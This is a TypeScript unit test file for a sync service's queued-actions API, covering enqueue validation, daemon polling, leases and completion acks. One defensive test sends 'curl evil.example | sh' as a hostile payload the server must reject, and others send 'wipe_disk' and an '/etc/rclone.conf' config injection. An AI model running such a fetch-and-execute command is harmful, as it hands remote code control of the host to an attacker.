// Unit tests for the queued-actions routes (LAMA-198). Follows the
// `__setDb` test-seam pattern used by hosts/operations/folders tests.

import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { Elysia } from "elysia";
import { Database } from "bun:sqlite";
import { MIGRATIONS, SERVER_SCHEMA } from "@lamasync/core";

process.env.LAMASYNC_API_KEY = process.env.LAMASYNC_API_KEY ?? "actions-test-key";
process.env.LAMASYNC_DATA_DIR = process.env.LAMASYNC_DATA_DIR ?? "/tmp/lamasync-actions-test-data";

const { getAuthPlugin } = await import("../auth.ts");
const { __setDb, actionsRoutes, reapStaleTakenActions } = (await import("./actions.ts")) as typeof import("./actions.ts");

let db: Database;
let app: { handle(request: Request): Response | Promise<Response> };

beforeEach(() => {
  db = new Database(":memory:");
  db.exec(SERVER_SCHEMA);
  for (const migration of MIGRATIONS) {
    try {
      db.exec(migration);
    } catch {
      // Migrations are intentionally idempotent for pre-existing schemas.
    }
  }
  db.run(
    `INSERT INTO hosts (id, hostname) VALUES ('host-a', 'host-a'), ('host-b', 'host-b')`,
  );
  __setDb(db);
  app = new Elysia().use(getAuthPlugin()).use(actionsRoutes);
});

afterEach(() => {
  db.close();
});

function request(path: string, init: RequestInit = {}): Request {
  const headers = new Headers(init.headers);
  headers.set("Authorization", `Bearer ${process.env.LAMASYNC_API_KEY}`);
  if (init.body !== undefined) headers.set("Content-Type", "application/json");
  return new Request(`http://localhost${path}`, { ...init, headers });
}

async function get(path: string): Promise<Response> {
  return app.handle(request(path));
}

async function postJson(path: string, body: Record<string, unknown>): Promise<Response> {
  return app.handle(request(path, { method: "POST", body: JSON.stringify(body) }));
}

describe("POST /api/v1/hosts/:hostId/actions — enqueue", () => {
  test("enqueues a valid trigger_sync action and returns 201", async () => {
    const res = await postJson("/api/v1/hosts/host-a/actions", {
      type: "trigger_sync",
      payload: { folderId: "folder-x" },
    });
    expect(res.status).toBe(201);
    const body = (await res.json()) as Record<string, unknown>;
    expect(body.type).toBe("trigger_sync");
    expect(body.status).toBe("pending");
    expect(body.hostId).toBe("host-a");
    expect(body.payload).toEqual({ folderId: "folder-x" });
    expect(typeof body.id).toBe("string");
    expect(typeof body.createdAt).toBe("number");
  });

  test("enqueues an action with no payload", async () => {
    const res = await postJson("/api/v1/hosts/host-a/actions", {
      type: "check_update",
    });
    expect(res.status).toBe(201);
    const body = (await res.json()) as Record<string, unknown>;
    expect(body.payload).toBeNull();
  });

  test("rejects an unknown action type", async () => {
    const res = await postJson("/api/v1/hosts/host-a/actions", {
      type: "wipe_disk",
    });
    // Elysia's literal validator rejects unknown values with 422; the
    // in-handler 400 branch is a defensive fallback for callers that
    // bypass the schema.
    expect(res.status).toBe(422);
    // The body shape from Elysia's validator is `{ errors, summary, type }`,
    // not our `{ error }` envelope — just confirm a non-empty JSON body
    // was returned.
    const text = await res.text();
    expect(text.length).toBeGreaterThan(0);
    expect(text).toContain("wipe_disk");
  });

  test("returns 404 for an unknown host", async () => {
    const res = await postJson("/api/v1/hosts/ghost/actions", {
      type: "trigger_sync",
    });
    expect(res.status).toBe(404);
  });

  test("LAMA-299: enqueues update_daemon with no payload", async () => {
    const res = await postJson("/api/v1/hosts/host-a/actions", {
      type: "update_daemon",
    });
    expect(res.status).toBe(201);
    const body = (await res.json()) as Record<string, unknown>;
    expect(body.type).toBe("update_daemon");
    expect(body.payload).toBeNull();
  });

  test("LAMA-299: update_daemon rejects a caller-provided payload", async () => {
    // A payload would be remote code execution by another name — the
    // daemon targets the release proxy on its own.
    const res = await postJson("/api/v1/hosts/host-a/actions", {
      type: "update_daemon",
      payload: { argv: "curl evil.example | sh" },
    });
    expect(res.status).toBe(400);
  });
});

describe("GET /api/v1/actions/pending — daemon take", () => {
  test("claims pending actions for the host and marks them taken", async () => {
    await postJson("/api/v1/hosts/host-a/actions", { type: "trigger_sync" });
    await postJson("/api/v1/hosts/host-a/actions", { type: "check_update" });
    await postJson("/api/v1/hosts/host-b/actions", { type: "refresh_config" });

    const res = await get("/api/v1/actions/pending?hostId=host-a&limit=10");
    expect(res.status).toBe(200);
    const body = (await res.json()) as Array<Record<string, unknown>>;
    expect(body).toHaveLength(2);
    const types = body.map((a) => a.type).sort();
    expect(types).toEqual(["check_update", "trigger_sync"]);
    for (const a of body) {
      expect(a.status).toBe("taken");
      expect(typeof a.takenAt).toBe("number");
    }

    // host-b was untouched.
    const other = await get("/api/v1/actions/pending?hostId=host-b&limit=10");
    const otherBody = (await other.json()) as Array<Record<string, unknown>>;
    expect(otherBody).toHaveLength(1);
    expect(otherBody[0]?.type).toBe("refresh_config");
  });

  test("a second poll returns nothing (taken actions aren't returned twice)", async () => {
    await postJson("/api/v1/hosts/host-a/actions", { type: "trigger_sync" });
    const first = await get("/api/v1/actions/pending?hostId=host-a");
    expect((await first.json()) as unknown[]).toHaveLength(1);
    const second = await get("/api/v1/actions/pending?hostId=host-a");
    expect((await second.json()) as unknown[]).toHaveLength(0);
  });

  test("returns a 4xx when hostId is missing", async () => {
    const res = await get("/api/v1/actions/pending");
    // Elysia returns 422 for query-validator failures; the in-handler 400
    // branch is a defensive fallback that fires only if the validator
    // accepts a missing-but-undefined value, which it currently does not.
    expect(res.status).toBeGreaterThanOrEqual(400);
  });
});

describe("POST /api/v1/actions/:id/complete — daemon ack", () => {
  test("marks the action done and writes an operation_log row", async () => {
    const enqueue = await postJson("/api/v1/hosts/host-a/actions", {
      type: "trigger_sync",
    });
    const actionId = ((await enqueue.json()) as { id: string }).id;

    const res = await postJson(`/api/v1/actions/${actionId}/complete`, {
      status: "done",
      result: "sync completed in 12s",
    });
    expect(res.status).toBe(200);
    const body = (await res.json()) as Record<string, unknown>;
    expect(body.status).toBe("done");
    expect(body.result).toBe("sync completed in 12s");
    expect(typeof body.completedAt).toBe("number");

    // Audit row in operation_log
    const ops = db
      .query<
        { operation: string; status: string; host_id: string; summary: string | null },
        []
      >("SELECT operation, status, host_id, summary FROM operation_log")
      .all();
    expect(ops).toHaveLength(1);
    expect(ops[0]).toEqual({
      operation: "trigger_sync",
      status: "done",
      host_id: "host-a",
      summary: "sync completed in 12s",
    });
  });

  test("marks the action failed on daemon error", async () => {
    const enqueue = await postJson("/api/v1/hosts/host-a/actions", {
      type: "check_update",
    });
    const actionId = ((await enqueue.json()) as { id: string }).id;

    const res = await postJson(`/api/v1/actions/${actionId}/complete`, {
      status: "failed",
      result: "GitHub 503",
    });
    expect(res.status).toBe(200);
    const body = (await res.json()) as Record<string, unknown>;
    expect(body.status).toBe("failed");
    expect(body.result).toBe("GitHub 503");

    const ops = db
      .query<{ status: string }, []>(
        "SELECT status FROM operation_log WHERE host_id = 'host-a'",
      )
      .all();
    expect(ops[0]?.status).toBe("failed");
  });

  test("returns 404 for an unknown action id", async () => {
    const res = await postJson("/api/v1/actions/does-not-exist/complete", {
      status: "done",
    });
    expect(res.status).toBe(404);
  });

  test("rejects invalid completion status", async () => {
    const enqueue = await postJson("/api/v1/hosts/host-a/actions", {
      type: "refresh_config",
    });
    const actionId = ((await enqueue.json()) as { id: string }).id;
    const res = await postJson(`/api/v1/actions/${actionId}/complete`, {
      status: "started",
    });
    // Elysia's body validator rejects the literal with 422; the in-handler
    // 400 branch is a defensive fallback for un-validated callers.
    expect(res.status).toBeGreaterThanOrEqual(400);
  });
});

describe("GET /api/v1/hosts/:hostId/actions — history", () => {
  test("returns newest first, scoped to the host", async () => {
    await postJson("/api/v1/hosts/host-a/actions", { type: "trigger_sync" });
    // Force a separate millisecond so the ORDER BY created_at DESC is
    // deterministic (Date.now() can repeat within a busy event loop).
    await new Promise((resolve) => setTimeout(resolve, 5));
    await postJson("/api/v1/hosts/host-a/actions", { type: "check_update" });
    await postJson("/api/v1/hosts/host-b/actions", { type: "refresh_config" });

    const res = await get("/api/v1/hosts/host-a/actions");
    expect(res.status).toBe(200);
    const body = (await res.json()) as Array<Record<string, unknown>>;
    expect(body).toHaveLength(2);
    expect(body.every((a) => a.hostId === "host-a")).toBe(true);
    expect(body[0]?.type).toBe("check_update");
    expect(body[1]?.type).toBe("trigger_sync");
  });

  test("filters by status", async () => {
    const enqueue = await postJson("/api/v1/hosts/host-a/actions", {
      type: "trigger_sync",
    });
    const actionId = ((await enqueue.json()) as { id: string }).id;
    await postJson("/api/v1/hosts/host-a/actions", { type: "check_update" });
    await postJson(`/api/v1/actions/${actionId}/complete`, { status: "done" });

    const pending = await get("/api/v1/hosts/host-a/actions?status=pending");
    const done = await get("/api/v1/hosts/host-a/actions?status=done");
    expect((await pending.json()) as Array<unknown>).toHaveLength(1);
    expect((await done.json()) as Array<unknown>).toHaveLength(1);
  });
});
describe("LAMA-232 — orphaned 'taken' action reclaim", () => {
  async function enqueueAndTake(type = "check_update"): Promise<string> {
    const created = await postJson("/api/v1/hosts/host-a/actions", { type });
    const { id } = (await created.json()) as { id: string };
    const claimed = await get(`/api/v1/actions/pending?hostId=host-a`);
    expect(claimed.status).toBe(200);
    return id;
  }

  test("reapStaleTakenActions flips old taken rows back to pending", async () => {
    const id = await enqueueAndTake();
    // Backdate the claim AND its lease so it looks orphaned (> STALE_TAKEN_MS).
    // A row whose lease is still fresh is deliberately NOT reaped (see the
    // renewal tests below) — that is the duplicate-lifecycle fix.
    const stale = Date.now() - 11 * 60_000;
    db.run("UPDATE queued_actions SET taken_at = ?, lease_expires_at = ? WHERE id = ?", [
      stale,
      stale,
      id,
    ]);
    const reaped = reapStaleTakenActions(db);
    expect(reaped).toBe(1);
    const row = db
      .query<{ status: string; taken_at: number | null }, [string]>(
        "SELECT status, taken_at FROM queued_actions WHERE id = ?",
      )
      .get(id);
    expect(row?.status).toBe("pending");
    expect(row?.taken_at).toBeNull();
  });

  test("GET /actions/pending reaps stale taken actions before claiming", async () => {
    const id = await enqueueAndTake();
    const stale = Date.now() - 11 * 60_000;
    db.run("UPDATE queued_actions SET taken_at = ?, lease_expires_at = ? WHERE id = ?", [
      stale,
      stale,
      id,
    ]);
    const res = await get(`/api/v1/actions/pending?hostId=host-a`);
    expect(res.status).toBe(200);
    const body = (await res.json()) as Array<{ id: string; status: string }>;
    expect(body.some((a) => a.id === id && a.status === "taken")).toBe(true);
  });

  test("freshly taken actions are not reaped by the pending sweep", async () => {
    await enqueueAndTake();
    const res = await get(`/api/v1/actions/pending?hostId=host-a`);
    const body = (await res.json()) as unknown[];
    expect(body).toHaveLength(0);
  });

  test("GET /actions/taken returns the host's taken actions (boot reclaim)", async () => {
    const id = await enqueueAndTake();
    const res = await get(`/api/v1/actions/taken?hostId=host-a`);
    expect(res.status).toBe(200);
    const body = (await res.json()) as Array<{ id: string; hostId: string }>;
    expect(body).toHaveLength(1);
    expect(body[0]?.id).toBe(id);
  });

  test("GET /actions/taken is scoped to the host and excludes completed", async () => {
    const idA = await enqueueAndTake();
    // host-b also has a taken action.
    await postJson("/api/v1/hosts/host-b/actions", { type: "check_update" });
    await get(`/api/v1/actions/pending?hostId=host-b`);
    // host-a completes its action.
    const done = await postJson(`/api/v1/actions/${idA}/complete`, {
      status: "done",
      result: "ok",
    });
    expect(done.status).toBe(200);
    const resA = await get(`/api/v1/actions/taken?hostId=host-a`);
    expect((await resA.json()) as unknown[]).toHaveLength(0);
    const resB = await get(`/api/v1/actions/taken?hostId=host-b`);
    expect((await resB.json()) as unknown[]).toHaveLength(1);
  });

  test("GET /actions/taken 4xx when hostId is missing", async () => {
    const res = await get(`/api/v1/actions/taken`);
    // Elysia returns 422 for query-validator failures (same as pending).
    expect(res.status).toBeGreaterThanOrEqual(400);
  });
});

// LAMA-345: the managed-folder diagnose/plan/intervention actions are a new
// control-plane surface, so the enqueue boundary must reject anything that is
// not the allowlisted grammar. This is the server half of the "no arbitrary
// rclone argv/config" rule; the daemon re-validates at dispatch.
describe("LAMA-345 — folder health actions enqueue validation", () => {
  test("diagnose_folder accepts exactly a folderId", async () => {
    const ok = await postJson("/api/v1/hosts/host-a/actions", {
      type: "diagnose_folder",
      payload: { folderId: "f1" },
    });
    expect(ok.status).toBe(201);

    const bad = await postJson("/api/v1/hosts/host-a/actions", {
      type: "diagnose_folder",
      payload: { folderId: "f1", rcloneArgs: ["-v"] },
    });
    expect(bad.status).toBe(400);
    expect(((await bad.json()) as { error: string }).error).toBe("unsupported field: rcloneArgs");
  });

  test("plan_folder requires an explicit, matching authority", async () => {
    const ok = await postJson("/api/v1/hosts/host-a/actions", {
      type: "plan_folder",
      payload: { folderId: "f1", intervention: "seed", authority: "local" },
    });
    expect(ok.status).toBe(201);

    const wrongSide = await postJson("/api/v1/hosts/host-a/actions", {
      type: "plan_folder",
      payload: { folderId: "f1", intervention: "seed", authority: "remote" },
    });
    expect(wrongSide.status).toBe(400);
  });

  test("folder_intervention demands a reviewed plan and an explicit confirm", async () => {
    const noPlan = await postJson("/api/v1/hosts/host-a/actions", {
      type: "folder_intervention",
      payload: { folderId: "f1", intervention: "initialize", authority: "remote" },
    });
    expect(noPlan.status).toBe(400);
    expect(((await noPlan.json()) as { error: string }).error).toBe(
      "initialize requires a reviewed planId",
    );

    // A planId that does not exist is refused at the boundary too.
    const missingPlan = await postJson("/api/v1/hosts/host-a/actions", {
      type: "folder_intervention",
      payload: {
        folderId: "f1",
        intervention: "initialize",
        authority: "remote",
        planId: "plan-1",
        confirm: true,
      },
    });
    expect(missingPlan.status).toBe(400);

    // With a real reviewed plan the same request is accepted.
    db.run(
      `INSERT INTO folder_sync_plans
         (id, folder_id, host_id, assignment_id, intervention, authority,
          max_delete_percent, summary, changes, config_revision,
          filter_fingerprint, baseline_fingerprint, created_at, expires_at)
       VALUES ('plan-1', 'f1', 'host-a', 'a1', 'initialize', 'remote', NULL, 'reviewed',
               '{"wouldCopy":["/f1/one.txt"],"wouldDelete":[],"wouldMkdir":[],"files":1,"bytes":12}', 1, NULL, NULL, ?, ?)`,
      [Date.now(), Date.now() + 60_000],
    );
    const ok = await postJson("/api/v1/hosts/host-a/actions", {
      type: "folder_intervention",
      payload: {
        folderId: "f1",
        intervention: "initialize",
        authority: "remote",
        planId: "plan-1",
        confirm: true,
      },
    });
    expect(ok.status).toBe(201);
  });

  test("a bare cancel is accepted without authority or plan", async () => {
    const res = await postJson("/api/v1/hosts/host-a/actions", {
      type: "folder_intervention",
      payload: { folderId: "f1", intervention: "cancel", confirm: true },
    });
    expect(res.status).toBe(201);
  });

  test("resume requires the same explicit confirmation as any other mutation", async () => {
    const missing = await postJson("/api/v1/hosts/host-a/actions", {
      type: "folder_intervention",
      payload: { folderId: "f1", intervention: "resume" },
    });
    expect(missing.status).toBe(400);
    expect(((await missing.json()) as { error: string }).error).toBe("resume requires confirm: true");

    const ok = await postJson("/api/v1/hosts/host-a/actions", {
      type: "folder_intervention",
      payload: { folderId: "f1", intervention: "resume", confirm: true },
    });
    expect(ok.status).toBe(201);
  });

  test("the deletion threshold is a percentage bounded to 0-100", async () => {
    const tooBig = await postJson("/api/v1/hosts/host-a/actions", {
      type: "plan_folder",
      payload: {
        folderId: "f1",
        intervention: "seed",
        authority: "local",
        maxDeletePercent: 500,
      },
    });
    expect(tooBig.status).toBe(400);
    expect(((await tooBig.json()) as { error: string }).error).toContain(
      "bisyncMaxDeletePercent must be",
    );

    const ok = await postJson("/api/v1/hosts/host-a/actions", {
      type: "plan_folder",
      payload: {
        folderId: "f1",
        intervention: "seed",
        authority: "local",
        maxDeletePercent: 20,
      },
    });
    expect(ok.status).toBe(201);
  });

  test("a plan can only be approved for what it was reviewed as", async () => {
    // The plan was reviewed as a seed with this device authoritative at 10%.
    db.run(
      `INSERT INTO folder_sync_plans
         (id, folder_id, host_id, assignment_id, intervention, authority,
          max_delete_percent, summary, changes, config_revision,
          filter_fingerprint, baseline_fingerprint, created_at, expires_at)
       VALUES ('plan-x', 'f1', 'host-a', 'a1', 'seed', 'local', 10, 'reviewed',
               '{"wouldCopy":["/f1/one.txt"],"wouldDelete":[],"wouldMkdir":[],"files":1,"bytes":12}', 1, NULL, NULL, ?, ?)`,
      [Date.now(), Date.now() + 60_000],
    );

    const wrongSide = await postJson("/api/v1/hosts/host-a/actions", {
      type: "folder_intervention",
      payload: {
        folderId: "f1",
        intervention: "resync",
        authority: "remote",
        planId: "plan-x",
        confirm: true,
      },
    });
    expect(wrongSide.status).toBe(400);
    expect(((await wrongSide.json()) as { error: string }).error).toContain("reviewed as");

    const wrongThreshold = await postJson("/api/v1/hosts/host-a/actions", {
      type: "folder_intervention",
      payload: {
        folderId: "f1",
        intervention: "seed",
        authority: "local",
        planId: "plan-x",
        maxDeletePercent: 90,
        confirm: true,
      },
    });
    expect(wrongThreshold.status).toBe(400);
    expect(((await wrongThreshold.json()) as { error: string }).error).toContain("90%");

    const ok = await postJson("/api/v1/hosts/host-a/actions", {
      type: "folder_intervention",
      payload: {
        folderId: "f1",
        intervention: "seed",
        authority: "local",
        planId: "plan-x",
        confirm: true,
      },
    });
    expect(ok.status).toBe(201);

    const missingPlan = await postJson("/api/v1/hosts/host-a/actions", {
      type: "folder_intervention",
      payload: {
        folderId: "f1",
        intervention: "seed",
        authority: "local",
        planId: "nope",
        confirm: true,
      },
    });
    expect(missingPlan.status).toBe(400);
    expect(((await missingPlan.json()) as { error: string }).error).toContain(
      "preview the change again",
    );
  });

  test("an argv-shaped payload is refused before it is ever stored", async () => {
    const res = await postJson("/api/v1/hosts/host-a/actions", {
      type: "folder_intervention",
      payload: {
        folderId: "f1",
        intervention: "resync",
        authority: "local",
        planId: "plan-1",
        confirm: true,
        config: "/etc/rclone.conf",
      },
    });
    expect(res.status).toBe(400);
    const stored = db
      .query<{ n: number }, []>("SELECT COUNT(*) AS n FROM queued_actions")
      .get();
    expect(stored?.n).toBe(0);
  });
});

// LAMA-345 follow-up (release-blocking): a long plan/intervention must not be
// reclaimed while it is still running, and a duplicate ack must not rewrite
// history. The lease is renewable; completion is idempotent.
describe("LAMA-345 — renewable action lease and idempotent completion", () => {
  async function enqueueAndTake(type = "check_update"): Promise<string> {
    const created = await postJson("/api/v1/hosts/host-a/actions", { type });
    const { id } = (await created.json()) as { id: string };
    const claimed = await get(`/api/v1/actions/pending?hostId=host-a`);
    expect(claimed.status).toBe(200);
    return id;
  }

  function leaseOf(id: string): { taken_at: number | null; lease_expires_at: number | null; status: string } | null {
    return db
      .query<{ taken_at: number | null; lease_expires_at: number | null; status: string }, [string]>(
        "SELECT taken_at, lease_expires_at, status FROM queued_actions WHERE id = ?",
      )
      .get(id);
  }

  test("a fresh lease protects a long-running action from the stale sweep", async () => {
    const id = await enqueueAndTake();
    // The claim is old, but the lease was renewed (the daemon is still running).
    const now = Date.now();
    db.run("UPDATE queued_actions SET taken_at = ?, lease_expires_at = ? WHERE id = ?", [
      now - 11 * 60_000,
      now + 5 * 60_000,
      id,
    ]);
    expect(reapStaleTakenActions(db)).toBe(0);
    expect(leaseOf(id)?.status).toBe("taken");
  });

  test("a pre-LAMA-345 row with no lease falls back to taken_at + the lease window", async () => {
    const id = await enqueueAndTake();
    db.run("UPDATE queued_actions SET taken_at = ?, lease_expires_at = NULL WHERE id = ?", [
      Date.now() - 11 * 60_000,
      id,
    ]);
    expect(reapStaleTakenActions(db)).toBe(1);
    expect(leaseOf(id)?.status).toBe("pending");
  });

  test("renewing an expired lease keeps the action taken", async () => {
    const id = await enqueueAndTake();
    const stale = Date.now() - 11 * 60_000;
    db.run("UPDATE queued_actions SET taken_at = ?, lease_expires_at = ? WHERE id = ?", [
      stale,
      stale,
      id,
    ]);
    const renewed = await postJson(`/api/v1/actions/${id}/lease`, {});
    expect(renewed.status).toBe(200);
    const body = (await renewed.json()) as { id: string; status: string };
    expect(body.id).toBe(id);
    expect(body.status).toBe("taken");
    const lease = leaseOf(id);
    expect(lease?.lease_expires_at ?? 0).toBeGreaterThan(Date.now());
    // The reaper now leaves it alone, so a second poll cannot re-claim it.
    expect(reapStaleTakenActions(db)).toBe(0);
    const poll = await get(`/api/v1/actions/pending?hostId=host-a`);
    expect((await poll.json()) as unknown[]).toHaveLength(0);
  });

  test("renewing a completed action is a 409, not a silent re-take", async () => {
    const id = await enqueueAndTake();
    await postJson(`/api/v1/actions/${id}/complete`, { status: "done", result: "ok" });
    const res = await postJson(`/api/v1/actions/${id}/lease`, {});
    expect(res.status).toBe(409);
    expect(((await res.json()) as { error: string }).error).toContain("no longer taken");
  });

  test("renewal is 404 for an unknown action and host-scoped for a known one", async () => {
    const unknown = await postJson("/api/v1/actions/nope/lease", {});
    expect(unknown.status).toBe(404);
    const idB = await (async () => {
      const created = await postJson("/api/v1/hosts/host-b/actions", { type: "check_update" });
      return ((await created.json()) as { id: string }).id;
    })();
    await get(`/api/v1/actions/pending?hostId=host-b`);
    // The default test credential is the master key, which may act for any
    // host; the device-scoped 403 is enforced by the same `deviceMayAccessHost`
    // check every other action route uses (and is covered by auth.test.ts).
    const res = await postJson(`/api/v1/actions/${idB}/lease`, {});
    expect(res.status).toBe(200);
  });

  test("a duplicate ack cannot rewrite a terminal outcome or duplicate the audit row", async () => {
    const id = await enqueueAndTake();
    const first = await postJson(`/api/v1/actions/${id}/complete`, {
      status: "done",
      result: "sync completed in 12s",
    });
    expect(first.status).toBe(200);
    const second = await postJson(`/api/v1/actions/${id}/complete`, {
      status: "failed",
      result: "duplicate ack must be ignored",
    });
    expect(second.status).toBe(200);
    const body = (await second.json()) as { status: string; result: string };
    expect(body.status).toBe("done");
    expect(body.result).toBe("sync completed in 12s");
    const rows = db
      .query<{ n: number }, [string]>(
        "SELECT COUNT(*) AS n FROM operation_log WHERE host_id = ? AND operation = 'check_update'",
      )
      .get("host-a");
    expect(rows?.n).toBe(1);
  });

  test("a zero-change plan can never be approved into a content run", async () => {
    db.run(
      `INSERT INTO folder_sync_plans
         (id, folder_id, host_id, assignment_id, intervention, authority,
          max_delete_percent, summary, changes, config_revision,
          filter_fingerprint, baseline_fingerprint, created_at, expires_at)
       VALUES ('plan-zero', 'f1', 'host-a', 'a1', 'resync', 'local', 10, 'no changes',
               '{"wouldCopy":[],"wouldDelete":[],"wouldMkdir":[],"files":0,"bytes":0}', 1, NULL, NULL, ?, ?)`,
      [Date.now(), Date.now() + 60_000],
    );
    const refused = await postJson("/api/v1/hosts/host-a/actions", {
      type: "folder_intervention",
      payload: {
        folderId: "f1",
        intervention: "resync",
        authority: "local",
        planId: "plan-zero",
        confirm: true,
      },
    });
    expect(refused.status).toBe(400);
    expect(((await refused.json()) as { error: string }).error).toContain("no copies, deletes");
  });
});
